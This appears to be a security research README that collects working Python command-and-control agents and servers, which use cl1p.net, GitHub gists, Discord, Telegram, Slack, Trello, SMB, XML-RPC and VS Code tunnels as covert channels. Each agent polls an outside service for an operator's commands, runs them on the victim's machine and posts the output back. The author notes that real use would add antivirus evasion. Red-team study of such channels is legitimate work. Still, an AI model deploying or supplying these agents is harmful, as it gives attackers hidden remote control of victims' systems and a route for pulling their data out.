# C2AllTheThings
"C2 All the Things" project is where I researched and listed things an attacker could use as a communication protocol. The idea behind the project is to show how things we use daily could be used in cybersecurity. Note that this list is by all means not complete and the PoCs are written in a fundamental way in Python to only show the impact and how it might be implemented. In real world all these codes must be re-implemented to evade AV/EDRs and to be feature-rich.

Name is inspired by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).

**Note that while these scenarios are used on certain platforms, It is possible to implement them in a similar way on all other related platforms.**

## Table of Contents
- [C2AllTheThings](#c2allthethings)
  - [Table of Contents](#table-of-contents)
  - [cl1p.net](#cl1pnet)
    - [Server](#server)
    - [Agent](#agent)
    - [Execution](#execution)
  - [Github](#github)
    - [Prerequisites](#prerequisites)
    - [Agent](#agent-1)
    - [Execution](#execution-1)
  - [Discord](#discord)
    - [Prerequisites](#prerequisites-1)
    - [Agent](#agent-2)
    - [Execution](#execution-2)
  - [Telegram](#telegram)
    - [Prerequisites](#prerequisites-2)
    - [Agent](#agent-3)
    - [Execution](#execution-3)
  - [Slack](#slack)
    - [Prerequisites](#prerequisites-3)
    - [Agent](#agent-4)
  - [Trello](#trello)
    - [Prerequisites](#prerequisites-4)
    - [Agent](#agent-5)
  - [Server Message Block (SMB)](#server-message-block-smb)
    - [Code](#code)
    - [Execution](#execution-4)
  - [Remote Procedure Call (RPC)](#remote-procedure-call-rpc)
    - [XML-RPC](#xml-rpc)
      - [Server](#server-1)
      - [Agent](#agent-6)
      - [Execution](#execution-5)
  - [Visual Studio Code](#visual-studio-code)
    - [Execution](#execution-6)


## cl1p.net
> "CL1P.NET is the internet clipboard. The easiest way to send data between internet connected devices. Just pick any URL that start with cl1p.net and put in data. Then on any other device enter in the same URL." - CL1P

In [cl1p](https://cl1p.net/) a scenario that comes to mind is to have two separate addresses, one for the hacker to store the command to be exeucted by the agent and another for the agent to store the output of the command into it.


### Server
```python
import requests
from bs4 import BeautifulSoup
import base64
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
RESPONSE_ID = "REDACTED_ID"
COMMAND_ID = "REDACTED_ID"

while True:
    cmd = input(": ")
    data = {
    'ttl': '0',
    'content': cmd,
    }
    response = requests.post('https://cl1p.net/'+COMMAND_ID, data=data, verify=False)
    while True:
        response = requests.get('https://cl1p.net/'+RESPONSE_ID, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        textarea = soup.find('textarea', {'id': 'cl1pTextArea'})

        if textarea:
            content = textarea.get_text().strip()
            content = base64.b64decode(content)
            print(content.decode())
            break
        else:
            time.sleep(1)
```
This code runs on the server side, where it continuously waits for input. Once input is received, it sends a request to a specific cl1p address to write the input there which is put in `content`. `ttl` is set to `0` for the cl1p website to automatically delete the content once viewed. Afterward, the server keeps monitoring a different cl1p address to check for the output of the command.

### Agent
```Python
import requests
from bs4 import BeautifulSoup
import subprocess
import base64
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
RESPONSE_ID = "REDACTED_ID"
COMMAND_ID = "REDACTED_ID"
def execute_system_command(cmd):
    output = subprocess.getstatusoutput(cmd)
    return output
while True:
    response = requests.get('https://cl1p.net/'+COMMAND_ID, verify=False)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        textarea = soup.find('textarea', {'id': 'cl1pTextArea'})
        if textarea:
            content = textarea.get_text().strip()
            output = execute_system_command(content)[1]
            data = {
            'ttl': '0',
            'content': base64.b64encode(output.encode()).decode(),
            }
            response = requests.post('https://cl1p.net/'+RESPONSE_ID, data=data, verify=False)
        else:
            time.sleep(1)

```
On the client-side, it keeps monitoring the address where the command is stored. When the address contains a command, it executes it. After execution, it sends the command’s output to a different address where the server can retrieve it and similar to the server code, `ttl` is also set to `0` here to delete the content once viewed.

### Execution
Let's see it in action now:
![clip](./images/clip-1.png)
As you can see I tried to give it some commands and it executed them and sent me the results. In a real world scenario, `client.py` would be in victim's system and `server.py` in attacker's.

## Github
> "GitHub is a proprietary developer platform that allows developers to create, store, manage, and share their code." - Github

In the case of [github](https://github.com), one of the scenarios that can be implmeneted is to create a private/public gist storing the command in the first comment or in a file. Then the script can read it executing the command as well as creating a new comment to store its output there.

### Prerequisites
For this scenario to work we have to create a Personal Access Token(PAT) in github. Moreover the PAT should have permissions over gist:
![git](./images/git-2.png)

### Agent
```python
from github import Github
from github import Auth,InputFileContent
import subprocess
import time
def execute_system_command(cmd):
    output = subprocess.getstatusoutput(cmd)
    return output
auth = Auth.Token("REDACTED_TOKEN")
g = Github(auth=auth)
user = g.get_user()
old_cmd = ""
while True:
    gist = user.get_gist("REDACTED_GIST_ID")
    comment = gist.get_comments()[0]
    if comment.body == "nothing": 
        time.sleep(1)
        continue
    output = execute_system_command(comment.body)[1]
    gist.create_comment(output)
    comment.edit(body="nothing")
```
The code on the client-side authenticates using the generated Personal Access Token (PAT) with gist permissions. It then continuously checks the first command in the gist. If the command is not `nothing`, it executes it and creates a new comment to store the command's output and sets the first comment to `nothing`. This is to check whether there is a new command.

### Execution
![git](./images/git-1.png)
There it is. I set the command in the first comment and the script executes it and then sets the first comment to `nothing`.

## Discord
> "Discord is great for playing games and chilling with friends, or even building a worldwide community. Customize your own space to talk, play, and hang out." - Discord

In this particular scenario involving Discord, it is needed to develop a bot and integrate it into a server, where it will be tasked with receiving commands. Subsequently, the bot will relay the corresponding outputs of those commands back to the server.

### Prerequisites
To exploit the bot functionality within Discord, the initial step is to create an application through the Discord Developer Portal and afterwards generate a bot within that application. Additionally, the bot must be granted specific privileges to ensure its proper functionality:
![privileges](./images/discord-1.png)

Following that we need to generate a OAuth2 URL to add our bot to the desired server where intend to issue our commands:
![privileges](./images/discord-2.png)

### Agent
```python
from discord.ext import commands
from discord.utils import get
from discord.ext.commands import Bot
import discord
from discord.utils import get
import subprocess
import time
DISCORD_TOKEN = "REDACTED_TOKEN"
def Exec(cmd):
    output = subprocess.check_output(cmd, shell=False)
    return output
intents = discord.Intents.all()
intents.members = True
intents.reactions = True
intents.guilds = True
bot = Bot("!", intents=intents)
@bot.command()
async def IssueCmd(ctx, arg):
    await ctx.send(arg)
@bot.event
async def on_message(message):   
    await message.channel.send(Exec(message.content).decode("utf-8"))
if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)
```
It has an event handler for all incoming messages and upon receiving one, it executes the command and sends back the result to the server.

### Execution
![discord](./images/discord-3.png)
I send the command in the server, the bot receives it, executes the command, and sends the result back to the server.

## Telegram
> "Telegram Messenger, commonly known as Telegram, is a cloud-based, cross-platform, social media and instant messaging service." - Wikipedia

This scenario is not unlike to the one used for Discord. In this scenario we also need to create a bot and use its API key in the code.

### Prerequisites
To create a bot in Telegram, We need use @botfather:
![botfather](./images/telegram-1.png)

### Agent
```python
import telebot
import subprocess
API_KEY = "REDACTED_API_KEY"
bot = telebot.TeleBot(API_KEY)
def execute_system_command(cmd):
    max_message_length = 2048
    output = subprocess.getstatusoutput(cmd)
    if len(output[1]) > max_message_length:
        return str(output[1][:max_message_length])
    return str(output[1])
@bot.message_handler()
def handle_any_command(message):
    if message.text.startswith("/start"):
        return
    response = execute_system_command(message.text)
    bot.reply_to(message, response)
bot.infinity_polling()
```
This code checks for any message in the bot private message and executes the command.

### Execution
![telegram](./images/telegram-2.png)
Upon receiving a command, the bot executes it and sends back the result.


## Slack
> "Slack is a new way to communicate with your team. It's faster, better organized, and more secure than email." - Slack

In this platform, we must create a bot and then add an event handler to receive an event when a message is added. And then the bot executes the command and sends the response to the channel.

### Prerequisites
First we need to create an app in Slack:

![slack](./images/slack-2.png)
Then add token scope:

![slack](./images/slack-3.png)
These permissions are needed to write messages and receive events.

After that, add the bot to the channel:

![slack](./images/slack-4.png)

### Agent
```python
import slack
from flask import Flask
from slackeventsapi import SlackEventAdapter
import subprocess
SLACK_TOKEN="REDACTED"
SIGNING_SECRET = "REDACTED"
def Exec(cmd):
    output = subprocess.check_output(cmd, shell=False)
    return output
app = Flask(__name__)
slack_event_adapter = SlackEventAdapter(SIGNING_SECRET, '/slack/events', app)
client = slack.WebClient(token=SLACK_TOKEN)
@slack_event_adapter.on('message')
def message(payload):
    event = payload.get('event', {})
    channel_id = event.get('channel')
    text = event.get('text')
    output = Exec(text).decode()
    client.chat_postMessage(channel=channel_id,text=output)
if __name__ == "__main__":
    app.run(debug=True,host="0.0.0.0")
```
Slack bot token adn signing secret must be put in the code in order for it to work.
An event handler is registered and the URL where the code is hosted must be added to event subscription:
![slack](./images/slack-5.png)
Then whenever a message is received an event is triggered and the script executes the command and sends back the result to the channel:
![slack](./images/slack-1.png)

## Trello
> "Trello is a web-based, kanban-style, list-making application developed by Atlassian." - Wikipedia

Trello is used for team management. It has boards, in it there are lists, and in the lists there are cards. each card can have description and comments. For This scenario I stored the command in the name of the card and the output is inserted in the comments.

### Prerequisites
For this to work we need to create a bot and get its API key and token in [https://trello.com/power-ups](https://trello.com/power-ups).

Then we need to create a board and gets id. When you create a board you have a URL like so: https://trello.com/b/\<random\>/\<name\>
append `.json` at the end of and you'll have json result. In it there is the board ID which we can use.

Now to get the lists we must use [https://api.trello.com/1/boards/board_id/lists/?key=key&token=token](https://api.trello.com/1/boards/board_id/lists/?key=key&token=token) and select a list we want to use.

From there we can get the cards using the following API:
[https://api.trello.com/1/lists/id/cards?key=key&token=token](https://api.trello.com/1/lists/id/cards?key=key&token=token)
### Agent
```python
import requests
import json
import subprocess

API_KEY = "REDACTED"
TOKEN = "REDACTED"
CARD_ID = "REDACTED"

def Exec(cmd):
    output = subprocess.check_output(cmd, shell=False)
    return output

while True:
    card_url = f"https://api.trello.com/1/cards/{CARD_ID}"
    comment_url = f"https://api.trello.com/1/cards/{CARD_ID}/actions/comments"
    headers = {
    "Accept": "application/json"
    }
    query = {
    'key': API_KEY,
    'token': TOKEN
    }
    response = requests.request(
    "GET",
    card_url,
    headers=headers,
    params=query
    )
    response_json = response.json()
    if response_json.get('name') == "nothing":
        continue

    output = Exec(response_json.get('name')).decode()
    data = {
        "text":output
    }
    requests.post(comment_url,params=query,headers=headers,data=data)
    requests.put(card_url,params=query,headers=headers,data={"name":"nothing"})
```
Here we make use of the card ID we got earlier. Then we use the corresponding API to get the name of the card and if it's not set to `nothing`:

![trello](./images/trello-2.png)

The script executes the command and adds a comment as the result of the command.
![trello](./images/trello-1.png)

## Server Message Block (SMB)
> "Server Message Block (SMB) is a communication protocol[1] used to share files, printers, serial ports, and miscellaneous communications between nodes on a network." - Wikipedia

SMB is used for file sharing mostly in a Windows environment. The scenario that can come to mind is when external access is restricted. But systems can still communiate with each other internally. If an attacker gains access to one of these systems, they could use SMB to establish a C2 channel AKA C2 over SMB channel, allowing them to execute commands on another victim machine and receive the results.

### Code
```python
import smbclient
import subprocess
smbclient.ClientConfig(username="", password="")
def Exec(cmd):
    output = subprocess.check_output(cmd, shell=False)
    return output
while True:
    try:
        output = ""
        with smbclient.open_file(r"\\127.0.0.1\share2\\cmd.txt", mode="r") as file:
            content = file.read()
            if not content:
                file.close()
                continue
            output = Exec(content).decode()
            file.close()
        with smbclient.open_file(r"\\127.0.0.1\share2\\output.txt", mode="a") as file:
            file.write(output)
            file.close()
        with smbclient.open_file(r"\\127.0.0.1\share2\\cmd.txt", mode="w") as file:
            file.write("")
            file.close() 
    except Exception as e:
        continue
```
This script authenticates using a username and password and then tries to access and read `cmd.txt` in `share2` shared folder. It executes the command if there is any and if not it constantly checks it. After receiving and executing the command, it stores the output in `output.txt` in the same `share2` shared folder.

### Execution
![smb](./images/smb-1.png)
Below is the traffic in Wireshark:
![smb](./images/smb-2.png)
As you can see all the traffic is going through SMB protocol.

## Remote Procedure Call (RPC)
> "a remote procedure call (RPC) is when a computer program causes a procedure (subroutine) to execute in a different address space (commonly on another computer on a shared computer network), which is written as if it were a normal (local) procedure call, without the programmer explicitly writing the details for the remote interaction." - Wikipedia

RPC is basically a mechanism for client-server interaction where the server has a procedure or function that the client calls.

### XML-RPC
> "XML-RPC is a remote procedure call (RPC) protocol which uses XML to encode its calls and HTTP as a transport mechanism." - Wikipedia

In this method we use XML-RPC protocol and HTTP as our transport mechanism. In simpler terms, all traffic goes through HTTP.

In this instance we have a server which provides a procedure that once called, asks for user input which is then passed to the client that called the procedure, and another procedure for the agent to send back the result.

#### Server
```python
import xmlrpc.server
class MyRPCServer:
    def __init__(self):
        pass

    def command(self):
        cmd = input("enter a command: ")
        return cmd

    def response(self, response):
        print("received: ", response)
        return "received"

def run_server():
    server = xmlrpc.server.SimpleXMLRPCServer(("localhost", 8000))
    server.register_instance(MyRPCServer()) 
    print("Server is running on http://localhost:8000")
    server.serve_forever()
if __name__ == "__main__":
    run_server()
```
We have two methods, `command` and `response`. upon calling `command` procedure, it asks for user input and then sends the input to the agent that called the procedure in the first place. Then the agent can call `response` procedure to send back the result.

#### Agent
```python
# client.py
import xmlrpc.client
import subprocess
def Exec(cmd):
    output = subprocess.check_output(cmd, shell=False)
    return output
def connect_to_server():
    server_url = "http://localhost:8000"
    proxy = xmlrpc.client.ServerProxy(server_url)
    
    command = proxy.command()
    output = Exec(command).decode()
    proxy.response(output)

if __name__ == "__main__":
    while True:
        connect_to_server()
```
Here the agent calls `command` procedure and then upon receiving the command, executes it and sends back the respone by calling `response` procedure.

#### Execution
![xmlrpc](./images/xmlrpc-1.png)
So here we provide the command and the agent executes it and gives us back the result.

![xmlrpc](./images/xmlrpc-2.png)
Now as you can see, all communication is based on HTTP protocol.

## Visual Studio Code
> "Visual Studio Code, commonly referred to as VS Code, is an integrated development environment developed by Microsoft for Windows, Linux, macOS and web browsers." - Wikipedia

VS Code has a feature named tunneling which enables developers to remotely connect to their workspace and code from browser. The tunnel is started on a client and then the developer is authorized by connecting to that tunnel and connecting it to their github.

Note that it is quite different from other scenarios where there was a program delivered to the victim and once executed, it would establish the connection from victim to the platform. But here the threat actor must first start the tunnel in the victim's system and then authorize themselves through github.

### Execution
First and foremost, we have to start the tunnel:
![code](./images/code-1.png)

Afterwards we have to authorize through github:

![code](./images/code-2.png)

Thereafter we have a working tunnel where we can execute code remotely in the browser as well as execute commands through the built-in terminal:
![code](./images/code-3.png)